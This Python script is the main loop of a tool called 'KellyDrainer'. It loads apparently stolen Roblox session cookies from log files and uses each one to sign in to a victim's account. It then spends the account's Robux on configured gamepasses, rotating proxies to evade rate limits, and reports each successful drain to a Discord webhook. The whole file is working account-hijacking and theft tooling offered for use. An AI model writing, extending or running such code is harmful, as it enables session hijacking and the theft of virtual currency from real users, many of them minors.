import json, time, os, threading, glob
from src.utils import (
    log, clear_console,
    GREEN, RED, BLUE, PURPLE, YELLOW,
    add_try, add_robux, set_app_name,
    update_cookie_count
)
from src.roblox import RobloxSession, CsrfError
from src.webhook import send_discord_webhook
from src.bot import start_bot
from src.proxy import load_proxies, get_next_proxy

INPUT_DIR = "input"
COOKIES_FILE = os.path.join(INPUT_DIR, "cookies.txt")
CONFIG_FILE = os.path.join(INPUT_DIR, "config.json")

def scrape_input_folder():
    all_cookies = []
    file_patterns = [
        os.path.join(INPUT_DIR, "robux*.txt"),
        os.path.join(INPUT_DIR, "rap*.txt")
    ]
    
    files_to_scrape = []
    for pattern in file_patterns:
        files_to_scrape.extend(glob.glob(pattern))
    
    for file in files_to_scrape:
        if "cookies.txt" in os.path.basename(file): continue
        try:
            with open(file, "r", encoding="utf-8") as f:
                for line in f:
                    parts = line.strip().split(":")
                    if len(parts) >= 3:
                        cookie = ":".join(parts[2:])
                        all_cookies.append(cookie)
        except Exception as e:
            log("[!]", f"Error reading {file}: {e}", RED)
    
    if all_cookies:
        existing = load_cookies()
        unique_new = [c for c in all_cookies if c not in existing]
        if unique_new:
            with open(COOKIES_FILE, "a", encoding="utf-8") as f:
                for c in unique_new:
                    f.write(c + "\n")
            log("[+]", f"Scraped {len(unique_new)} new cookies!", GREEN)

def load_config():
    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except FileNotFoundError:
        log("[!]", "config.json not found!", RED)
        exit()

def load_cookies():
    if not os.path.exists(COOKIES_FILE): return []
    with open(COOKIES_FILE, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]

def save_cookies(cookies):
    with open(COOKIES_FILE, "w", encoding="utf-8") as f:
        f.write("\n".join(cookies))

def main():
    if not os.path.exists(INPUT_DIR): os.makedirs(INPUT_DIR)
    
    config = load_config()
    gamepasses = sorted(config.get("gamepasses", []), key=lambda x: x['price'], reverse=True)
    
    use_proxy = config.get("use_proxy", True)
    proxy_list = load_proxies() if use_proxy else []
    current_proxy = get_next_proxy(proxy_list) if use_proxy else None

    clear_console()
    mode_text = "[Proxied]" if use_proxy else "[Proxyless]"
    set_app_name(f"KellyDrainer {mode_text}")
    
    if config.get("bot_token"):
        threading.Thread(target=start_bot, args=(config["bot_token"],), daemon=True).start()

    scrape_input_folder()
    update_cookie_count()

    cookies = load_cookies()
    log("[+]", f"Loaded {len(cookies)} cookies | {len(proxy_list)} proxies", BLUE)

    i = 0
    while i < len(cookies):
        cookie = cookies[i]
        try:
            user = RobloxSession(cookie, proxies=current_proxy)
            balance = user.get_balance()
            log("[#]", f"{user.username} | Balance: {balance} R$", PURPLE)

            if balance <= 1 or 0:
                log("[!]", "Zero balance, removing...", RED)
                cookies.pop(i)
                save_cookies(cookies)
                update_cookie_count()
                continue

            gp_idx = 0
            while gp_idx < len(gamepasses):
                gp = gamepasses[gp_idx]
                gaid, price = gp["id"], gp["price"]

                if balance >= price:
                    log("[...]", f"Buying: {price} R$", BLUE)
                    status_code, status_json = user.buy_gamepass(gaid)
                    
                    purchased = False
                    reason = "Unknown"
                    if isinstance(status_json, dict):
                        purchased = status_json.get("purchased", False)
                        reason = status_json.get("reason", "None")

                    if purchased:
                        add_try()
                        add_robux(price)
                        balance -= price
                        log("[✓]", f"Success! {user.username} bought {price} R$", GREEN)

                        webhook_url = config.get("webhook")
                        if webhook_url and webhook_url.startswith("http"):
                            try:
                                send_discord_webhook(
                                    webhook_url,            
                                    user.username,      
                                    user.user_id,         
                                    gaid,                
                                    price,              
                                    status_code,          
                                    status_json,         
                                    "Success",          
                                    config.get("user_id")  
                                )
                            except Exception as e:
                                log("[!]", f"Webhook failed: {e}", RED)

                        time.sleep(config.get("delay", 1))
                    else:
                        if status_code == 429 or "TooManyRequests" in reason:
                            if use_proxy:
                                log("[!]", "RATELIMITED! Swapping proxy...", YELLOW)
                                current_proxy = get_next_proxy(proxy_list)
                                user = RobloxSession(cookie, proxies=current_proxy) 
                                time.sleep(1)
                                continue 
                            else:
                                log("[!]", "RATELIMITED! waiting 60 seconds...", YELLOW)
                                time.sleep(60)
                                continue
                        else:
                            log("[x]", f"Failed: {reason}", RED)
                            gp_idx += 1
                else:
                    gp_idx += 1

        except CsrfError:
            log("[!]", "Invalid cookie, removing...", RED)
            cookies.pop(i)
            save_cookies(cookies)
            update_cookie_count()
            continue
        except Exception as e:
            log("[!]", f"Error processing cookie: {e}", RED)
            i += 1
            continue

        i += 1
        update_cookie_count()
        time.sleep(config.get("delay", 1))

    log("[+]", "Finished!", GREEN)

if __name__ == "__main__":
    main()
